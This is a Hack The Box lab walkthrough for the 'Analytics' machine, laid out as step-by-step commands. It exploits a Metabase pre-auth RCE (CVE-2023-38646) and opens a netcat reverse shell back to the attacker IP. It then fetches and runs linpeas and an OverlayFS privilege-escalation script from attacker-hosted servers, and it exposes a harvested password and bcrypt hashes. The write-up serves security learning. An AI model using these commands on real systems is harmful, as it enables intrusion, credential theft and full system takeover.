# Analytics - Easy

```sh
sudo vim /etc/hosts
# add analytics.htb

nmap -T4 -p- -A -Pn -v analytics.htb
```

* Open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
    * 80/tcp - http - nginx 1.18.0

* The webpage on port 80 leads to <http://analytical.htb>, so we need to map this domain as well in ```/etc/hosts```

* The website is for 'Analytical', and the text on the webpage does not have any significant info; however, the source code shows a page for login at <http://data.analytical.htb> - we have to add this subdomain in ```/etc/hosts```

* This subdomain leads us to a page for Metabase login - we can check the source code for any indicators

* If we search for keyword 'version' in the source code for the login webpage, we can see that this is Metabase v0.46.6

* Googling for exploits associated with this version leads us to [CVE-2023-38646](https://www.exploit-db.com/exploits/51797) - this is a pre-auth RCE vulnerability:

    ```sh
    # download the exploit

    python3 metabase_0.46.6_exploit.py
    # we need to specify local IP, port and target IP, port

    nc -nvlp 4444
    # setup a listener

    python3 metabase_0.46.6_exploit.py -l 10.10.14.33 -p 4444 -P 80 -u http://data.analytical.htb
    # this gives us a shell from the exploit itself
    # but it is a limited shell, we can get a more functional shell

    # setup another listener on attacker
    nc -nvlp 4445

    # in metabase shell, use this reverse-shell one-liner - others do not work
    nc 10.10.14.33 4445 -e sh

    # we get a reverse shell on port 4445

    # we cannot upgrade to a stable reverse shell as we do not have python
    # limited shell features

    ls -la
    # we have a non-standard directory in /

    ls -la /home
    # only metabase user

    ls -la /home/metabase
    # user flag not found

    cd /metabase.db
    # here, we have 2 DB files
    # before moving it to our machine, we can try checking content with strings

    strings metabase.db.trace.db

    strings metabase.db.mv.db
    ```

* From the lengthy ```strings``` output, we get a few strings of interest:

    * we get a string 'metalytics@data.htbJJohnnyISmith' - the email 'metalytics@data.htb' is of interest, the latter could be username or password
    * we have a few bcrypt hashes mentioned - '$2a$10$HnyM8tXhWXhlxEtfzNJE0.z.aA6xkb5ydTRxV5uO5v7IxfoZm08LG' and '$2a$10$Wtzh/a3aa6rO1OYVXXi7V.BKVt9uEyx7gZ6MHxqdn7cFy17uCvWUa' - tried cracking but did not work
    * site running on <http://127.0.0.1:3000>
    * another email address 'metalytics@analytical.htb' given

* Enumerating further, we can use ```linpeas.sh```:

    ```sh
    # in attacker
    python3 -m http.server

    # in victim shell
    cd /tmp
    wget http://10.10.12.23:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* Going through the output of ```linpeas```, under the environment variables section, we have a non-standard env var 'META_PASS' with value 'An4lytics_ds20223#'

* We can now try using the above password for new user 'metalytics':

    ```sh
    ssh metalytics@analytical.htb
    # use above password
    # it works

    ls -la
    # get user flag

    # we can check with linpeas for privesc

    uname -r
    # 6.2.0-25-generic
    
    cat /etc/lsb-release
    ```

* The box is running "Ubuntu 22.04.3 LTS"; googling for exploits related to this release give us results for [GameOver(lay) Ubuntu privesc - CVE-2023-2640 & CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) - we can try this exploit:

    ```sh
    wget https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/refs/heads/main/exploit.sh -O overlayfs-exploit.sh
    # download the exploit on attacker machine

    python3 -m http.server

    # fetch on target ssh session
    wget http://10.10.12.34:8000/overlayfs-exploit.sh

    chmod +x overlayfs-exploit.sh

    ./overlayfs-exploit.sh
    # we are root now

    cat /root/root.txt
    # root flag
    ```
